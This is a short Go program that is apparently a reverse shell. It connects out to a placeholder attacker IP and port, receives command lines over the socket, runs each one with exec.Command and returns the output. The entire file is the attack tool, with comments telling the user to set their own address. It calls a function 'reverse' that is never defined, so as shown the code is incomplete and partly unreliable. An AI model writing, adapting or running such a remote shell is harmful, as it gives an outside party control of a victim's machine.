package main

import (
	"bufio"
	"fmt"
	"net"
	"os/exec"
	"strings"
	"time"
)

// change this!
const IP = "192.168.0.1"

// and this
const PORT = 4443

func main() {
	conn, err := net.DialTimeout("tcp", fmt.Sprintf("%s:%d", IP, PORT), time.Second*3)

	if err != nil {
		fmt.Println(err)
		panic("Can't connect")
	}
	defer conn.Close()

	r := bufio.NewReader(conn)
	for {
		reverse(conn, r)
		mess, _ := bufio.NewReader(conn).ReadString('\n')
		out, err := exec.Command(strings.TrimSuffix(mess, "\n")).Output()
		if err != nil {
			fmt.Fprintf(conn, "%s\n", err)
		}
		fmt.Fprintf(conn, "%s\n> ", out)
	}
}
